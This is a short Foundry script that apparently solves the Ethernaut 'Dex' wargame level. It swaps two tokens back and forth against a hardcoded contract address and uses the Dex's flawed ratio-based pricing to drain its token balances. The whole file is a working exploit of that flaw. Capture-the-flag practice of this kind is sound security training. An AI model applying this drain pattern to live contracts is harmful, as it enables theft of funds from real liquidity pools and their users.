//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Dex}  from "src/ethernaut22.sol";
import {console} from "lib/forge-std/src/console.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";


contract ethernaut22Script is Script{
 Dex instance = Dex(payable(0xbBA2c63CDBBC22a2495a2A37f0B0329579608f67));   
 address tokenA = address(instance.token1());
 address tokenB = address(instance.token2());
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        instance.approve(address(instance),10000);
        instance.swap(tokenA,tokenB,10);

        address wallet = vm.addr(vm.envUint("PRIVATE_KEY"));

        for(uint i=0;i<4;i++){
            uint256 tokenABalance = IERC20(tokenA).balanceOf(wallet);
            uint256 tokenBBalance = IERC20(tokenB).balanceOf(wallet);
            if(tokenABalance == 0){
                instance.swap(tokenB,tokenA,tokenBBalance);
            }else{
                instance.swap(tokenA,tokenB,tokenABalance);
            }
        }

        //instance.swap(tokenB,tokenA,45);



        console.log("Wallet Token A:", IERC20(tokenA).balanceOf(wallet));
        console.log("Wallet Token B:", IERC20(tokenB).balanceOf(wallet));

        console.log("Dex Token A:", IERC20(tokenA).balanceOf(address(instance)));
        console.log("Dex Token B:", IERC20(tokenB).balanceOf(address(instance)));

        vm.stopBroadcast();
    }
}

